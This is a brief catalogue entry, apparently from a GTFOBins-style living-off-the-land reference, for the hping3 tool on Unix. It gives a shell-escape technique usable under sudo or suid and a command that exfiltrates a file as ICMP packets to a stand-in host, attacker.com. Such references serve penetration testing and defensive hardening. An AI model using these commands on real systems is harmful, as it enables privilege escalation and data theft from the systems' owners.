---
type: gtfobin
name: hping3
platform: Unix
functions: [shell, upload]
tags: [gtfobin, unix, lotl]
---

# hping3

## shell

```bash
hping3
/bin/sh
```
**Contexts:** sudo, suid, unprivileged

## upload

```bash
hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file
```
_The file is continuously sent as ICMP packets (e.g., of `999` bytes), the optional `--end` parameter signals when the file reached the end._
**Contexts:** sudo
